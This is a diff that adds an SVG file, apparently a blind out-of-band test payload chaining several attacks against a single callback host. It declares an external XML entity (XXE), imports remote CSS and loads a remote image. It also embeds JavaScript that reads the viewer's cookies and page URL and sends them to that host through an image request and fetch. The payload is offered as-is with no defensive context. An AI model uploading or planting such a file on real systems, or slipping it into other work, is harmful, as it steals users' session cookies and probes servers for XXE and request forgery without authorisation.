@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "https://d9sujpnn0ftcf0rj8fn0apqyg8xupxgbq.oast.site/svgchain-XXE?r=1">]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200" viewBox="0 0 300 200">
+  <style>@import url('https://d9sujpnn0ftcf0rj8fn0apqyg8xupxgbq.oast.site/svgchain-CSS?r=1');</style>
+  <script type="text/javascript">
+    (function(){var u='https://d9sujpnn0ftcf0rj8fn0apqyg8xupxgbq.oast.site/svgchain-JS?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href);try{new Image().src=u;}catch(e){}try{fetch(u).catch(function(){})}catch(e){}})();
+  </script>
+  <image x="0" y="0" width="300" height="200" href="https://d9sujpnn0ftcf0rj8fn0apqyg8xupxgbq.oast.site/svgchain-IMG?r=1"/>
+  <text x="10" y="30" font-size="14">https://d9sujpnn0ftcf0rj8fn0apqyg8xupxgbq.oast.site/svgchain-BARE?r=1</text>
+  <text x="10" y="55" font-size="14">&xxe;Blind SVG payload</text>
+</svg>
